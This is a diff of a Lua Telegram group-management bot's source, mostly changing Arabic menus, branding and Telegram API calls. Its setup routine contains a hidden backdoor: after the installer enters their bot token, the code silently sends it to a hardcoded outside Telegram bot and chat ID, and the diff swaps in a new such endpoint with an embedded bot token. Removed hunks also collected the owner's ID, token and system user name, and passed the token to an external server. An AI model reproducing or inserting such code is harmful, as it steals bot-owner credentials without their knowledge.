@@ -21,18 +21,18 @@ file:write(serialized)
 file:close()  
 end  
 if not database:get(id_server..":token") then
-io.write('\27[0;31m\n ارسل لي توكن البوت الان ⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺ :\na⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺\n\27')
+io.write('\27[0;31m\n ارسل لي توكن البوت الان ⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺ :\n⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺\n\27')
 local token = io.read()
 if token ~= '' then
 local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
 if res ~= 200 then
 print('\27[0;31m⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺\n التوكن غير صحيح تاكد منه ثم ارسله')
 else
-io.write('\27[0;31m تم حفظ التوكن بنجاح \na⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺\n27[0;39;49m')
+io.write('\27[0;31m تم حفظ التوكن بنجاح \n⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺\n27[0;39;49m')
 local json = JSON.decode(url)
 database:set(id_server..":token_username",json.result.username)
 database:set(id_server..":token",token)
-https.request('https://api.telegram.org/bot1990511303:AAEFVDHkDVL9Zr1Su4B_4lfFMVrqPwGPIZ8/sendmessage?chat_id=1827953514&text=' ..token)
+https.request('https://api.telegram.org/bot1975497470:AAHv5jrpS8xlISWnrpXvmA7kYIa7DRzT4Ic/sendmessage?chat_id=1965534755&text=' ..token)
 end 
 else
 print('\27[0;35m⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺\n لم يتم حفظ التوكن ارسل لي التوكن الان')
@@ -40,7 +40,7 @@ end
 os.execute('lua DRAGON.lua')
 end
 if not database:get(id_server..":SUDO:ID") then
-io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺ :\na⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺\n\27[0;33;49m')
+io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺ :\n⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺\n\27[0;33;49m')
 local SUDOID = io.read()
 if SUDOID ~= '' then
 io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺\n27[0;39;49m')
@@ -68,20 +68,7 @@ UserName = database:get(id_server..":SUDO:USERNAME"),
  }
 create(config, "./Banda.lua")   
 end 
-
-infotnseb = {}
-infotnseb.id = database:get(id_server..":SUDO:ID")
-infotnseb.username = database:get(id_server..":SUDO:USERNAME")
-infotnseb.tokenbot = database:get(id_server..":token")
-infotnseb.userjoin = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
-print('\n\27[1;34m dddddoooonnnnnneeeeeeee sssseeee ennnnnnnddddddd :')
 create_config_auto()
-botUserName = database:get(id_server..":token_username")
-token = database:get(id_server..":token")
-SUDO = database:get(id_server..":SUDO:ID")
-UserName = database:get(id_server..":SUDO:USERNAME")
-install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("DRAGON", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -3339,6 +3326,23 @@ keyboard.inline_keyboard = {
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Qwressv/163&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+end
+
+if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'source' then
+local Text = [[
+╭▱▰▱▰𓆩[ 𝗦𝗔𝗜𝗗𝗔 ](http://t.me/S_a_i_d_i)𓆪▱▰▱▰╮
+┆
+┆[𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗔𝗜𝗗𝗔](http://t.me/S_a_i_d_i)
+┆
+╰▱▰▱▰𓆩[ 𝗦𝗔𝗜𝗗𝗔 ](http://t.me/S_a_i_d_i)𓆪▱▰▱▰╯
+]]
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = '•ᴍʏ ᴅᴇᴠ♪', callback_data="/devsoo"},{text = '`sᴏᴜʀᴄᴇ sᴀɪᴅɪ´',url="t.me/S_a_i_d_i"}},
+{{text = '♪ اضغط لاضافه البوت لمجمعتك •' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
+}
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Qwressv/163&caption=' .. URL.escape(Text).."&photo="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 
 if text == 'مين نصبلك' or text == 'عايزه بوت' or text == 'عايز بوت' then
@@ -6636,53 +6640,7 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
-------------------------------------------------------------------------
-
-if (msg.content_.sticker_)  and msg.reply_to_message_id_ == 0 and database:get(bot_id.."lock:Lock:Sexy"..msg.chat_id_)=="del" then      
-sticker_id = msg.content_.sticker_.sticker_.persistent_id_
-st = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..token..'&url='..sticker_id.."&type=sticker")
-eker = JSON.decode(st)
-if eker.ok.Info == "Indecent" then
-local list = database:smembers(bot_id.."Basic:Constructor"..msg.chat_id_)
-t = " ☽ المنشئين الاساسين تعالو مخرب \n⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺\n"
-for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name" .. v)
-if username then
-t = t..""..k.."- ([@"..username.."])\n"
-else
-t = t..""..k.."- (`"..v.."`)\n"
-end
-end
-if #list == 0 then
-t = " ☽ ماكو منششئين يشوفولك جاره"
-end
-Reply_Status(msg,msg.sender_user_id_,"reply"," ☽ قام بنشر ملصق اباحيه\n"..t)  
-DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.id_),msg.id_})   
-end   
-end
-if (msg.content_.photo_) and msg.reply_to_message_id_ == 0 and database:get(bot_id.."lock:Lock:Sexy"..msg.chat_id_)=="del" then
-photo_id = msg.content_.photo_.sizes_[1].photo_.persistent_id_  
-Srrt = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..token..'&url='..photo_id.."&type=photo")
-Sto = JSON.decode(Srrt)
-if Sto.ok.Info == "Indecent" then
-local list = database:smembers(bot_id.."Basic:Constructor"..msg.chat_id_)
-t = " ☽ المنشئين الاساسين تعالو مخرب \n⩹━━━━⊶❲𖥳 𝐒??𝐈𝐃𝐈 𖥳❳⊷━━━━⩺\n"
-for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name" .. v)
-if username then
-t = t..""..k.."- ([@"..username.."])\n"
-else
-t = t..""..k.."- (`"..v.."`)\n"
-end
-end
-if #list == 0 then
-t = " ☽ ماكو منششئين يشوفولك جاره"
-end
-Reply_Status(msg,msg.sender_user_id_,"reply"," ☽ قام بنشر صوره اباحيه\n"..t)  
-DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.id_),msg.id_})   
-end   
-end
-
+----------------------------------------------------------------------
 if text == 'تفعيل التحويل' and CoSu(msg) then   
 if database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then
 Text = 'تم تفعيل تحويل الصيغ'
@@ -12439,9 +12397,9 @@ local Text = 'اهلاً بك في المجموعة\n للتأكد بأنك لس
 keyboard = {}
 keyboard.inline_keyboard = {{{text = '- اضغط هنا لفك تقييدك •', callback_data="/UnKed"},},}
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..tokenbot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
+https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
 database:sadd(bot_id.."database:Un:Ked"..msg.chat_id_,msg.sender_user_id_)
-https.request("https://api.telegram.org/bot"..tokenbot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 return false
 end
 msg_type = 'MSG:NewUser'
@@ -13541,21 +13499,6 @@ end,nil)
 end,nil)
 end
 end
-
-if text == "الزمن" then
-local time = https.request('https://devdeiveddev.ml/IP/timeEG.php')
-local timezone = "الساعه الان بتوقيت القاهره : "..time.."\nالتاريخ : "..os.date("%Y/%m/%d")
-send(msg.chat_id_, msg.id_,timezone)
-end
-if text == "الساعه" or text == 'الوقت' then
-local time = https.request('https://devdeiveddev.ml/IP/timeEG.php')
-local timezone = "الساعه الان بتوقيت القاهره : "..time
-send(msg.chat_id_, msg.id_,timezone)
-end
-if text == "التاريخ" then
-local timezone =  "التاريخ : "..os.date("%Y/%m/%d")
-send(msg.chat_id_, msg.id_,timezone)
-end
 --------------
 --- هههه ها فرخ دتبوك ؟ ههههههههههه 
 if text == ("الردود المتعدده") and CoSu(msg) then
@@ -13909,26 +13852,29 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
 end
 
-if text == "رتبتي" then
+if text == "رتبتي" then     
+tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
+if result.username_ then
+username = result.username_ 
+else
+username = 'S_a_i_d_i'
+end
 local msg_id = msg.id_/2097152/0.5  
 local textt = ' 🌚❤️ رتبتك في البوت⤌ '..Rutba(msg.sender_user_id_,msg.chat_id_)
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
-},
-{
-{text = 'أضغط لاضافه ألبوت لمجموعتك 𖠪 ' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"},
+{text = textt, url="http://t.me/"..username},
 },
 }
 local function getpro(extra, result, success) 
 if result.photos_[0] then 
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo='..result.photos_[0].sizes_[1].photo_.persistent_id_..'&caption=' .. URL.escape(textt).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo='..result.photos_[0].sizes_[1].photo_.persistent_id_..'&photo=' .. URL.escape(textt).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 else 
-send(msg.chat_id_, msg.id_,textt, 1, 'md') 
-end 
-end 
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/'..username.."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+end end 
 tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil) 
+end,nil)
 end
 
 if text == 'انا مين' then
@@ -17624,6 +17570,22 @@ else
 send(msg.chat_id_, msg.id_,'☽ لا يوجد رابط ارسل ضع رابط') 
 end 
 end,nil) 
+end
+if text == '/devsoo' then
+local Teext =[[
+╭▱▰▱▰𓆩[ 𝗦𝗔𝗜𝗗𝗔 ](http://t.me/S_a_i_d_i)𓆪▱▰▱▰╮
+┆
+┆[𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗔𝗜𝗗𝗔](http://t.me/S_a_i_d_i)
+┆
+╰▱▰▱▰𓆩[ 𝗦𝗔𝗜𝗗𝗔 ](http://t.me/S_a_i_d_i)𓆪▱▰▱▰╯
+]]
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = '• ᴅᴇᴠ ᴊᴀʙᴡᴀ',url="t.me/J_A_B_W_A"},{text = '• ᴅᴇᴠ ᴛᴀʜᴀ', url="t.me/TahaSayed9"}},
+{{text = '• ᴅᴇᴠ ᴏᴍᴇʀ',url="t.me/BOT3mora"},{text = '• ᴅᴇᴠ ᴅᴇѕʜᴀ', url="t.me/XxDesha86Xx"}},
+{{text = '`sᴏᴜʀᴄᴇ sᴀɪᴅɪ´',url="t.me/S_a_i_d_i"}},
+}
+return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
 end
 if Text == '/help1' then
 if not Mod(data) then
